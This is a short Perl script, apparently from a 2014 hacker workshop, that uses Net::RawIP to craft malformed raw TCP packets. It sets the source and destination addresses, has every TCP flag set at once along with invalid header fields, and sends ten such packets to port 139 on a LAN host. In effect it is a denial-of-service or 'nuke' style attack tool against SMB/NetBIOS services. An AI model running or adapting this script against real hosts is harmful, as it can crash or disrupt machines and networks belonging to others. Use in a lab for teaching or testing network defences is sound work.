#!/usr/bin/perl
# kdw hackerworkshop 2014
# it's great and fun and fast
# men need three things:
# 1. well charged mobile battery
# 2. reachability
# 3. this script
# have fun, klaus

require 'getopts.pl';
# ---- ip header ----------
# setze nur die optionen die zu setzen sind. 
# Fehler fuehren zu Packetverlust
$version = 4;
$ihl = 5;
$tos = 10;
$tot_len = 100;
$id = 16;
$frag_off = 0x4000;
$ttl = 32;
$protocol = 6;
$check = 20;
$saddr = "192.168.27.254";
$daddr = "192.168.27.110";
# ------- tcp header -----------
$source = 139; $dest = 139;
$seq = 34; $ack_seq = 20;
$doff = 0x16; $res1 = 15; $res2 = 3;
#$urg = 1; $ack = 0;$psh = 1; $rst = 1; $syn = 1; $fin = 0;;
$urg = 1; $ack = 1;$psh = 1; $rst = 1; $syn = 1; $fin = 1;;
$window =65536;$check = 0; $urg_ptr = 12;
$data = 0;
#-------------
use Net::RawIP;
$tcp = new Net::RawIP;
$tcp->set({ ip => {
saddr => $saddr,daddr => $daddr,
check => $check
},
tcp => {
source => $source, dest => $dest,
seq => $seq, ack_seq => $ack_seq,
doff => $doff, res1 => $res1,
res2 => $res2, urg => $urg,
ack => $ack, psh => $psh,
rst => $rst, syn => 1,
fin => $fin, window => $window,
check => $check, urg_ptr => $urg_ptr,
data => $data,
}
});
### --- and send 10 times---->>>>>
for ($i=0;$i<10;$i++){
$tcp->send(1,1);
# ----- that's it
}